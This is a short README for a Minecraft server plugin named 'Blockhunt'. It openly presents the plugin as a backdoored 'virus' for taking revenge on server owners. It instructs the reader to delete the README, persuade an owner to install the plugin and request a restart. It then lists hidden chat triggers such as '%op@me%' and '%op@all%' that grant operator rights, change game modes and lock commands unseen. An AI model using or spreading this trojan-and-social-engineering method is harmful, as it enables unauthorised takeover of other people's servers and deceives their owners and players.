# Blockhunt
Are you in need of revenge to a server or server owner? Here's a lovely plugin that'll trick those owners that are desperate for
players.

Beginning:
- Download the plugin, **remove the README.md** (because this is just a guide to actually fooling the owner).
- Convince the server owner or admin to download the plugin you sent him/her.
- Once installed into the server, if the owner already hasn't, ask for a restart.

Middle:
Now you have the virus inside the victim server, you can now run the secret commands!
Whenever you run a secret command like %gmc@me%, no one will see that your gamemode was changed like it does with the /gamemode.
Secret commands:
1. ```%op@me%``` _(Op yourself)_
2. ```%op@all%``` _(Op all players)_
3. ```%lock@commands%``` _(Lock predefined commands)_
4. ```%unlock@commands%``` _(Unlock the locked commands)_
5. ```%gmc@me%``` _(Change your gamemode to creative)_
6. ```%gmc@all%``` _(Change everyone's gamemode to creative)_
7. ```%status@lock@commands%``` (See the status for commands)_
